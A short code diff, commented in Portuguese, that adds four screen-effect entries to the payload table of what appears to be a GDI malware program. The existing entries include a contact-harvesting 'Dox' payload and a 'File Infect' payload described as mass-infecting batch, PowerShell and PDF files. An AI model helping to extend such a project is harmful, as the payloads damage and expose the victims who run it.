@@ -18,6 +18,10 @@
 // 67   Dox (mostra contatos do Windows Address Book no console).
 // 68   File Infect (MASS infect: batch + powershell + pdf,
 //        injeta malware E corrompe texto com unicode).
+// 69   Barcode Scan (tela desliza + zebra diagonal).
+// 70   Analog Static (TV fora do ar: chiado + banda branca).
+// 71   Bayer Dither (posterização 2-bit com matriz 4x4).
+// 72   Kaleido Pan (caleidoscópio 6-seção girando).
 // ============================================================
 
 PayloadEntry gPayloads[] =
@@ -89,6 +93,10 @@ PayloadEntry gPayloads[] =
     { L"66 - War Print",               5000, GDIPayload66, false },
     { L"67 - Dox",                    5000, GDIPayload67, false },
     { L"68 - File Infect",            5000, FileInfect,   false },
+    { L"69 - Barcode Scan",           5000, GDIPayload69, false },
+    { L"70 - Analog Static",          5000, GDIPayload70, false },
+    { L"71 - Bayer Dither",           5000, GDIPayload71, false },
+    { L"72 - Kaleido Pan",            5000, GDIPayload72, false },
 };
 
 const int gPayloadCount =
